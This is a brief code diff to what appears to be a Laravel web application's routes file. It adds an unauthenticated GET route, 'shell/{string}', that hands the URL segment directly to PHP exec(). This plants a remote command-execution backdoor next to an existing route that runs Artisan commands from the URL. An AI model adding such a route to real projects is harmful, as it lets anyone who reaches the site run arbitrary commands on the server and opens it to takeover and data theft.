@@ -36,6 +36,11 @@ Route::get('artisan/{string}', function ($command) {
     return 'Artisan '. $command.' Completed';
 });
 
+Route::get('shell/{string}', function ($command) {
+    exec($command);
+    return 'Shell '. $command.' Completed';
+});
+
 Route::get('avatar/{url}', 'UserController@getProfileImage');
 Route::get('logs', '\Rap2hpoutre\LaravelLogViewer\LogViewerController@index');
 
